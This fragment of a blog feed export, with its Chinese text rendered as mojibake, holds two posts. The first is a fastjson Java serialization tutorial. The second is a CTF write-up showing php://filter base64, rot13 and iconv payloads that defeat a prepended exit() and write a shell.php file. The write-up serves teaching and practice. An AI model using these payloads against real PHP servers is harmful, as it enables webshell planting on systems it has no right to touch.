<h2 id="å°†JAVAå¯¹è±¡è½¬æ¢æˆjsonæ ¼å¼"><a href="#å°†JAVAå¯¹è±¡è½¬æ¢æˆjsonæ ¼å¼" class="headerlink" title="å°†JAVAå¯¹è±¡è½¬æ¢æˆjsonæ ¼å¼"></a>å°†JAVAå¯¹è±¡è½¬æ¢æˆjsonæ ¼å¼</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ys.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> org.junit.Before;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Fortest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> List&lt;JavaToJson&gt; listOfJava = <span class="keyword">new</span> ArrayList&lt;JavaToJson&gt;();</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Before</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUp</span><span class="params">()</span></span>&#123;</span><br><span class="line">        listOfJava.add(<span class="keyword">new</span> JavaToJson(<span class="number">18</span>,<span class="string">&quot;wndmd&quot;</span>,<span class="keyword">new</span> Date()));</span><br><span class="line">        listOfJava.add(<span class="keyword">new</span> JavaToJson(<span class="number">20</span>,<span class="string">&quot;Json!&quot;</span>,<span class="keyword">new</span> Date()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        String list = JSON.toJSONString(listOfJava);</span><br><span class="line">        System.out.println(list);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ³¨æ„ï¼Œä¸Šè¿°ä»£ç éœ€è¦å¦å¤–èµ·ä¸€ä¸ªç±»ï¼Œtestä¸å…è®¸åœ¨æœ‰å‚æ„é€ çš„ç±»ä¸­å‡ºç°</p>
<p>å¾—åˆ°è¾“å‡ºç»“æœï¼š</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;<span class="attr">&quot;Age&quot;</span>:<span class="number">18</span>,</span><br><span class="line">     <span class="attr">&quot;DATE OF BIRTH&quot;</span>:<span class="number">1604309562809</span>,</span><br><span class="line">     <span class="attr">&quot;FULL NAME&quot;</span>:<span class="string">&quot;wndmd&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;Age&quot;</span>:<span class="number">20</span>,</span><br><span class="line">        <span class="attr">&quot;DATE OF BIRTH&quot;</span>:<span class="number">1604309562809</span>,</span><br><span class="line">        <span class="attr">&quot;FULL NAME&quot;</span>:<span class="string">&quot;Json!&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬è¿˜å¯ä»¥æ ¼å¼åŒ–è‡ªå®šä¹‰è¾“å‡ºï¼Œæ§åˆ¶å­—æ®µçš„æ’åºã€‚</p>
<p>æˆ‘ä»¬æ›´æ–°beanå¹¶æ·»åŠ å¦‚ä¸‹å­—æ®µï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaToJson</span> </span>&#123;</span><br><span class="line">    <span class="meta">@JSONField(name = &quot;Age&quot;,serialize = false)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@JSONField(name = &quot;FULL NAME&quot;,ordinal = 2)</span></span><br><span class="line">    <span class="keyword">private</span> String fullName;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@JSONField(name = &quot;DATE OF BIRTH&quot;,format = &quot;dd/MM/yyyy&quot;,ordinal = 1)</span></span><br><span class="line">    <span class="keyword">private</span> Date date;</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„åœ¨è¿™é‡Œæˆ‘ä»¬æ·»åŠ serialize = falseï¼Œè¿™é‡Œæ˜¯é»˜è®¤æˆ‘ä»¬æ·»åŠ åºåˆ—åŒ–ï¼Œå¦‚æœæˆ‘ä»¬è®¾ç½®ä¸ºfalseï¼Œè¯¥å­—æ®µå°†ä¸ä¼šè¢«æ˜¾ç¤ºã€‚</p>
<p>è€Œordinalï¼Œåˆ™æ˜¯ç”¨äºè§„å®šæ ¼å¼åŒ–çš„é¡ºåºï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœä½ æƒ³æ§åˆ¶ï¼Œæœ€å¥½å°±å…¨éƒ¨éƒ½ä½¿ç”¨è¯¥å±æ€§ä¿®é¥°ï¼Œæˆ–è€…ä½ è‡ªå·±å¹²è„†å†™çš„æ—¶å€™å°±ä»ä¸Šå‘ä¸‹å†™ï¼Œä¸ç„¶çš„è¯ï¼Œé»˜è®¤ä»ä¸Šå‘ä¸‹æ‰§è¡Œï¼Œåªä¼šå†æŒ‰ç…§ordinalé™å®šçš„é¡ºåºæ’åˆ—</p>
<p>ä¸Šè¿°ä»£ç è¾“å‡ºï¼š</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;DATE OF BIRTH&quot;</span>:<span class="string">&quot;02/11/2020&quot;</span>,</span><br><span class="line">     	<span class="attr">&quot;FULL NAME&quot;</span>:<span class="string">&quot;wndmd&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line"> 	&#123;</span><br><span class="line">        <span class="attr">&quot;DATE OF BIRTH&quot;</span>:<span class="string">&quot;02/11/2020&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;FULL NAME&quot;</span>:<span class="string">&quot;Json!&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>å¦‚æœå°†serializeçš„falseå»æ‰ä¹‹åï¼Œä»–è¿˜æ˜¯ç¬¬ä¸€ä¸ªè¢«æ‰§è¡Œï¼š</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;Age&quot;</span>:<span class="number">18</span>,</span><br><span class="line">        <span class="attr">&quot;DATE OF BIRTH&quot;</span>:<span class="string">&quot;02/11/2020&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;FULL NAME&quot;</span>:<span class="string">&quot;wndmd&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;Age&quot;</span>:<span class="number">20</span>,</span><br><span class="line">        <span class="attr">&quot;DATE OF BIRTH&quot;</span>:<span class="string">&quot;02/11/2020&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;FULL NAME&quot;</span>:<span class="string">&quot;Json!&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h2 id="ä½œç”¨å¯¹è±¡"><a href="#ä½œç”¨å¯¹è±¡" class="headerlink" title="ä½œç”¨å¯¹è±¡"></a>ä½œç”¨å¯¹è±¡</h2><p>@JSONField çš„ä½œç”¨å¯¹è±¡:</p>
<ul>
<li><ol>
<li>Field</li>
</ol>
</li>
<li><ol start="2">
<li>Setter å’Œ Getter æ–¹æ³•</li>
</ol>
</li>
</ul>
<p>éœ€è¦æ³¨æ„å¦‚ä¸‹ä¸¤ç‚¹ï¼š</p>
<p><strong>æ³¨æ„ï¼š</strong>FastJson åœ¨è¿›è¡Œæ“ä½œæ—¶ï¼Œæ˜¯æ ¹æ® getter å’Œ setter çš„æ–¹æ³•è¿›è¡Œçš„ï¼Œå¹¶ä¸æ˜¯ä¾æ® Field è¿›è¡Œã€‚</p>
<p><strong>æ³¨æ„ï¼š</strong>è‹¥å±æ€§æ˜¯ç§æœ‰çš„ï¼Œå¿…é¡»æœ‰ set æ–¹æ³•ã€‚å¦åˆ™æ— æ³•ååºåˆ—åŒ–ã€‚</p>
<p>è·Ÿè¿›JSONFieldæŸ¥çœ‹æºç ï¼Œå¯ä»¥çŸ¥é“æˆ‘ä»¬å…è®¸æŒ‡å®šå¾ˆå¤šä¸œè¥¿=ã€‚=ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> JSONField &#123;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">ordinal</span><span class="params">()</span> <span class="keyword">default</span> 0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">name</span><span class="params">()</span> <span class="keyword">default</span> &quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">format</span><span class="params">()</span> <span class="keyword">default</span> &quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">serialize</span><span class="params">()</span> <span class="keyword">default</span> <span class="keyword">true</span></span>;</span><br><span class="line">	<span class="comment">//æ³¨æ„è¿™é‡Œï¼Œååºåˆ—åŒ–ï¼</span></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">deserialize</span><span class="params">()</span> <span class="keyword">default</span> <span class="keyword">true</span></span>;</span><br><span class="line"></span><br><span class="line">    SerializerFeature[] serialzeFeatures() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    Feature[] parseFeatures() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">label</span><span class="params">()</span> <span class="keyword">default</span> &quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">jsonDirect</span><span class="params">()</span> <span class="keyword">default</span> <span class="keyword">false</span></span>;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; serializeUsing() <span class="keyword">default</span> Void.class;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; deserializeUsing() <span class="keyword">default</span> Void.class;</span><br><span class="line"></span><br><span class="line">    String[] alternateNames() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">unwrapped</span><span class="params">()</span> <span class="keyword">default</span> <span class="keyword">false</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">defaultValue</span><span class="params">()</span> <span class="keyword">default</span> &quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="é…ç½®æ–¹å¼"><a href="#é…ç½®æ–¹å¼" class="headerlink" title="é…ç½®æ–¹å¼"></a>é…ç½®æ–¹å¼</h2><p>FieldInfo å¯ä»¥é…ç½®åœ¨ getter/setter æ–¹æ³•æˆ–è€…å­—æ®µä¸Šã€‚ä¾‹å¦‚ï¼š</p>
<h3 id="é…ç½®åœ¨-getter-setter-ä¸Š"><a href="#é…ç½®åœ¨-getter-setter-ä¸Š" class="headerlink" title="é…ç½®åœ¨ getter/setter ä¸Š"></a>é…ç½®åœ¨ getter/setter ä¸Š</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">      <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line"> </span><br><span class="line">      <span class="meta">@JSONField(name=&quot;ID&quot;)</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getId</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> id;&#125;</span><br><span class="line">      <span class="meta">@JSONField(name=&quot;ID&quot;)</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">int</span> value)</span> </span>&#123;<span class="keyword">this</span>.id = id;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="é…ç½®åœ¨-field-ä¸Š"><a href="#é…ç½®åœ¨-field-ä¸Š" class="headerlink" title="é…ç½®åœ¨ field ä¸Š"></a>é…ç½®åœ¨ field ä¸Š</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">     <span class="meta">@JSONField(name=&quot;ID&quot;)</span></span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line"></span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getId</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> id;&#125;</span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">int</span> value)</span> </span>&#123;<span class="keyword">this</span>.id = id;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="åˆ›å»º-JSON-å¯¹è±¡"><a href="#åˆ›å»º-JSON-å¯¹è±¡" class="headerlink" title="åˆ›å»º JSON å¯¹è±¡"></a>åˆ›å»º JSON å¯¹è±¡</h2><p>åˆ›å»º JSON å¯¹è±¡éå¸¸ç®€å•ï¼Œåªéœ€ä½¿ç”¨ JSONObjectï¼ˆfastJsonæä¾›çš„jsonå¯¹è±¡ï¼‰ å’Œ JSONArrayï¼ˆfastJsonæä¾›jsonæ•°ç»„å¯¹è±¡ï¼‰ å¯¹è±¡å³å¯ã€‚</p>
<p>è™½ç„¶JSONArryayä¹Ÿå¯ä»¥åˆ›å»ºä¸€ä¸ªJSONå¯¹è±¡ï¼Œä½†æˆ‘è§‰å¾—ä¹¦å†™æ–¹å¼ä¸å¤Ÿç¾è§‚ï¼Œå…¶ä¸­å¦‚ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">whenGenerateJson_thanGenerationCorrect</span><span class="params">()</span> <span class="keyword">throws</span> ParseException </span>&#123;</span><br><span class="line">    JSONArray jsonArray = <span class="keyword">new</span> JSONArray();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) &#123;</span><br><span class="line">        JSONObject jsonObject = <span class="keyword">new</span> JSONObject();</span><br><span class="line">        jsonObject.put(<span class="string">&quot;AGE&quot;</span>, <span class="number">10</span>);</span><br><span class="line">        jsonObject.put(<span class="string">&quot;FULL NAME&quot;</span>, <span class="string">&quot;Doe &quot;</span> + i);</span><br><span class="line">        jsonObject.put(<span class="string">&quot;DATE OF BIRTH&quot;</span>, <span class="string">&quot;2016/12/12 12:12:12&quot;</span>);</span><br><span class="line">        jsonArray.add(jsonObject);</span><br><span class="line">    &#125;</span><br><span class="line">    String jsonOutput = jsonArray.toJSONString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="JSON-å­—ç¬¦ä¸²è½¬æ¢ä¸º-Java-å¯¹è±¡"><a href="#JSON-å­—ç¬¦ä¸²è½¬æ¢ä¸º-Java-å¯¹è±¡" class="headerlink" title="JSON å­—ç¬¦ä¸²è½¬æ¢ä¸º Java å¯¹è±¡"></a>JSON å­—ç¬¦ä¸²è½¬æ¢ä¸º Java å¯¹è±¡</h2><p>fastjsonå…è®¸æˆ‘ä»¬å¯ä»¥å°†å‰ç«¯ä¼ æ¥çš„æ•°æ®è½¬æ¢å˜æˆJSONæ•°æ®ï¼ŒåŒæ ·çš„ä¹Ÿå…è®¸æˆ‘ä»¬æŠŠåç«¯æ•°æ®è½¬æ¢ä¸ºJSONå­—ç¬¦ä¸²ä¸¢ç»™å‰ç«¯ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">jsonToJava</span><span class="params">()</span></span>&#123;</span><br><span class="line">        JavaToJson miaomiaomiao = <span class="keyword">new</span> JavaToJson(<span class="number">21</span>, <span class="string">&quot;miaomiaomiao&quot;</span>, <span class="keyword">new</span> Date());</span><br><span class="line">        String jsonObject = JSON.toJSONString(miaomiaomiao);</span><br><span class="line"><span class="comment">//        System.out.println(jsonObject);</span></span><br><span class="line"><span class="comment">//        è¿™å‰é¢çš„partæˆ‘ä»¬å°†æ•°æ®è½¬æ¢æˆäº†JSONæ•°æ®</span></span><br><span class="line">        JavaToJson newJavaObject = JSON.parseObject(jsonObject,JavaToJson.class);</span><br><span class="line"><span class="comment">//        æŒ‡å®šéœ€è¦è½¬æ¢çš„JSONå­—ç¬¦ä¸²ï¼Œå¹¶ä¸”æŒ‡å®šåŸå‹,è¿™æ ·çš„è¯ä¸€ä¸ªJAVAå¯¹è±¡å°±æŒ‡å®šå¥½äº†</span></span><br><span class="line">        System.out.println(newJavaObject.getAge());</span><br><span class="line">        System.out.println(newJavaObject.getFullName());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="ä½¿ç”¨ContextValuFilteré…ç½®JSONè½¬æ¢"><a href="#ä½¿ç”¨ContextValuFilteré…ç½®JSONè½¬æ¢" class="headerlink" title="ä½¿ç”¨ContextValuFilteré…ç½®JSONè½¬æ¢"></a>ä½¿ç”¨ContextValuFilteré…ç½®JSONè½¬æ¢</h3><p>åœ¨æœ‰äº›åœºæ™¯ä¸­ï¼Œå¯¹Valueåšè¿‡æ»¤ï¼Œéœ€è¦è·å¾—æ‰€è¿°JavaBeançš„ä¿¡æ¯ï¼Œè€Œæˆ‘ä»¬å¯èƒ½æƒ³è¦è¿‡æ»¤æŸäº›ä¿¡æ¯ï¼Œä¾¿å¯ä»¥ä½¿ç”¨è¯¥æ–¹æ³•è¿›è¡Œæ“ä½œäº†ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Before</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">before</span><span class="params">()</span></span>&#123;</span><br><span class="line">      listOfJava.add(<span class="keyword">new</span> JavaToJson(<span class="number">31</span>,<span class="string">&quot;wdnmd&quot;</span>,<span class="keyword">new</span> Date()));</span><br><span class="line">      listOfJava.add(<span class="keyword">new</span> JavaToJson(<span class="number">33</span>,<span class="string">&quot;wd&quot;</span>,<span class="keyword">new</span> Date()));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Test</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">givenContextFilter_whenJavaObject_thanJsonCorrect</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      ContextValueFilter valueFilter = <span class="keyword">new</span> ContextValueFilter () &#123;</span><br><span class="line">          <span class="function"><span class="keyword">public</span> Object <span class="title">process</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">                  BeanContext context, Object object, String name, Object value)</span> </span>&#123;</span><br><span class="line">              <span class="keyword">if</span> (name.equals(<span class="string">&quot;DATE OF BIRTH&quot;</span>)) &#123;</span><br><span class="line">                  <span class="keyword">return</span> <span class="string">&quot;NOT TO DISCLOSE&quot;</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">if</span> (value.equals(<span class="string">&quot;wdnmd&quot;</span>)) &#123;</span><br><span class="line">                  <span class="keyword">return</span> ((String) value).toUpperCase();</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                  <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;;</span><br><span class="line">      String jsonOutput = JSON.toJSONString(listOfJava, valueFilter);</span><br><span class="line">      System.out.println(jsonOutput);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>ç»è¿‡ä¸Šè¿°ä»£ç çš„æ“ä½œï¼Œæˆ‘ä»¬çš„æ—¶é—´å°†ä¼šä¿®æ”¹ä¸ºNOT TO DISCLOSEï¼Œå¹¶ä¸”æ•°æ®ä¸­ä¸åŒ…å«wdnmdçš„å°†ä¼šè¢«è¿‡æ»¤,å…·ä½“è¾“å‡ºå¦‚ä¸‹ï¼š</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;DATE OF BIRTH&quot;</span>:<span class="string">&quot;NOT TO DISCLOSE&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">     &#123;</span><br><span class="line">         <span class="attr">&quot;DATE OF BIRTH&quot;</span>:<span class="string">&quot;NOT TO DISCLOSE&quot;</span></span><br><span class="line">     &#125;,</span><br><span class="line">     &#123;</span><br><span class="line">         <span class="attr">&quot;DATE OF BIRTH&quot;</span>:<span class="string">&quot;NOT TO DISCLOSE&quot;</span>,<span class="attr">&quot;FULL NAME&quot;</span>:<span class="string">&quot;wdnmd&quot;</span></span><br><span class="line">     &#125;,</span><br><span class="line">     &#123;</span><br><span class="line">         <span class="attr">&quot;DATE OF BIRTH&quot;</span>:<span class="string">&quot;NOT TO DISCLOSE&quot;</span></span><br><span class="line">     &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>å¼€å‘</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>å…¨å›½å·¥æ§2020-web-easyphp</title>
    <url>/2020/10/27/%E5%85%A8%E5%9B%BD%E5%B7%A5%E6%8E%A72020-web-easyphp/</url>
    <content><![CDATA[<h1 id="å…¨å›½å·¥æ§2020-web-easyphp"><a href="#å…¨å›½å·¥æ§2020-web-easyphp" class="headerlink" title="å…¨å›½å·¥æ§2020-web-easyphp"></a>å…¨å›½å·¥æ§2020-web-easyphp</h1><h2 id="1-ä»ä¼ªåè®®å¼€å§‹è¯´èµ·"><a href="#1-ä»ä¼ªåè®®å¼€å§‹è¯´èµ·" class="headerlink" title="1.ä»ä¼ªåè®®å¼€å§‹è¯´èµ·"></a>1.ä»ä¼ªåè®®å¼€å§‹è¯´èµ·</h2><p>php://filteræ˜¯PHPä¸­ç‹¬æœ‰çš„åè®®ï¼Œè¯¥åè®®æµå…è®¸æˆ‘ä»¬ä½œä¸ºä¸€ä¸ªä¸­é—´æµæ¥å¤„ç†å…¶ä»–æµï¼Œ</p>
<p>åœ¨ä¹‹å‰ä¸‰ä¸ªç™½å¸½ä¸­æœ‰ä¸€ä¸ªæ¯”èµ›ï¼Œå…¶ä¸­ä¸€éƒ¨åˆ†çš„ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$content = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line">$content .= $_POST[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line">file_put_contents($_POST[<span class="string">&#x27;filename&#x27;</span>], $content);</span><br></pre></td></tr></table></figure>

<h3 id="1-base64"><a href="#1-base64" class="headerlink" title="1.base64"></a>1.base64</h3><p>åœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹è§ï¼Œå¦‚æœæ­£å¸¸çš„ç¼–è¯‘ä»£ç ï¼Œç”±äºåœ¨å¼€å¤´åŠ å…¥äº†exitå†…å®¹ï¼Œå³ä½¿æˆ‘ä»¬å†™å…¥äº†ä¸€å¥è¯ä¹Ÿæ— æ³•è§£æã€‚</p>
<p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡filenameåœ¨phpå†™å…¥çš„æ—¶å€™æ„é€ åè®®ï¼Œæ‰€ä»¥åˆ©ç”¨base64-decodeæ–¹æ³•è§£ç æ„é€ ä¸€å¥è¯çš„payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PD9waHAgcGhwaW5mbygpOyA&#x2F;Pg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯åœ¨è¿™é‡Œæˆ‘ä»¬åˆä¼šå‘ç°å¦‚æœç›´æ¥æ‰“å…¥è¿›å»ï¼Œbase64è§£ææ²¡æœ‰æˆåŠŸï¼Œè¿™å°±æ˜¯å› ä¸ºbaseæ˜¯ç”±4å­—èŠ‚ç»„æˆä¸€æ¬¡payloadã€‚æ‰€ä»¥è¯è¯´å›å»ï¼Œ</p>
<p>å½“æˆ‘ä»¬ä½¿ç”¨base64decodeåè®®çš„æ—¶å€™ï¼Œ&lt; ? ; ?&gt;ç­‰ç­‰éƒ½ä¸ä¼šè¢«è§£æï¼Œæ‰€ä»¥æºä»£ç åˆ™ä¼šè¢«è¯†åˆ«ä¸ºï¼š</p>
<p>phpexitï¼Œè€Œbase64æ˜¯å››ä¸ªå­—èŠ‚è¿˜åŸæˆä¸€ä¸ªå­—æ¯ï¼Œæ•…æˆ‘ä»¬éœ€è¦å†å ä¸€ä¸ªä½æ•°ï¼Œç»™å¥¹ï¼Œä¹Ÿå°±æ˜¯phpexit[?]æ„é€ æˆå…«ä¸ªå­—èŠ‚ä¾›basedecodeä½¿ç”¨ï¼Œä¹‹ååœ¨åé¢å†ç¼–ä¸Šæˆ‘ä»¬è‡ªå·±çš„payloadï¼Œæ‰€ä»¥è¿™é“é¢˜å¯ä»¥æ„é€ å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=convert.base64-decode/resource=shell.php&amp;txt=cPD9waHAgcGhwaW5mbygpOyA/Pg==</span></span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯è¿™é‡Œä»éœ€è¦æ³¨æ„ï¼Œæˆ‘ä»¬æ„é€ çš„æ—¶å€™payloadå½“ä¸­ä¸å…è®¸å‡ºç°+å·ç­‰ç‰¹æ®Šå­—ç¬¦ï¼Œå¦åˆ™ä¼šé‡è§æ²¡æœ‰è¢«å†™ä¸Šå»æƒ…å†µã€‚ï¼Œå®é™…ä¸Šï¼Œé™¤äº†baseè¿‡æ»¤å™¨ï¼Œè¿˜æœ‰å¾ˆå¤šè¿‡æ»¤å™¨å¯ä»¥ä¾›ç»™æˆ‘ä»¬ä½¿ç”¨ï¼š</p>
<p>å®˜ç½‘ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;filters.php è¿‡æ»¤å™¨</span><br><span class="line">https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;filters.convert.php è½¬æ¢è¿‡æ»¤å™¨</span><br><span class="line">https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;filters.string.php å­—ç¬¦è¿‡æ»¤å™¨</span><br></pre></td></tr></table></figure>

<h3 id="2-rot13"><a href="#2-rot13" class="headerlink" title="2.rot13"></a>2.rot13</h3><p>é™¤æ­¤ä¹‹å¤–æˆ‘å°è¯•ä½¿ç”¨rot13æ¥ç»•è¿‡ï¼Œä½†æ˜¯ä¼šå‘ç°rot13ä¹‹åçš„ç»“æœä¸åˆæ³•</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=string.rot13/resource=shell.php&amp;txt=<span class="meta">&lt;?</span>cuc cucvasb();<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°phpä¸ºï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>cuc rkvg; <span class="meta">?&gt;</span><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™æ ·çš„è¯ï¼Œå› ä¸ºå¤šäº†ä¸€ä¸ªåˆ†å·ï¼Œè€Œå¯¼è‡´å¤±è´¥äº†ï¼ˆå¼€å¯çŸ­æ ‡ç­¾çš„æƒ…å†µä¸‹ï¼Œåªè¦ç”¨&lt;? ?&gt;ä¸­çš„å†…å®¹å°±ä¼šè¢«è§£æï¼‰ä½†å¦‚æœå…³é—­çŸ­æ ‡ç­¾çš„æƒ…å†µä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">txt=<span class="meta">?&gt;</span><span class="meta">&lt;?</span>cuc cucvasb();<span class="meta">?&gt;</span>&amp;filename=php:<span class="comment">//filter/write=string.rot13/resource=shell.php</span></span><br></pre></td></tr></table></figure>

<p>æˆåŠŸï¼é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜è¡¥å……ä¸€ç§éªšæ€è·¯ï¼š</p>
<h3 id="3-iconvå­—ç¬¦ç¼–ç è½¬æ¢"><a href="#3-iconvå­—ç¬¦ç¼–ç è½¬æ¢" class="headerlink" title="3.iconvå­—ç¬¦ç¼–ç è½¬æ¢"></a>3.iconvå­—ç¬¦ç¼–ç è½¬æ¢</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> iconv(<span class="string">&quot;utf-8&quot;</span>,<span class="string">&quot;utf-7&quot;</span>,<span class="string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span>)</span><br></pre></td></tr></table></figure>

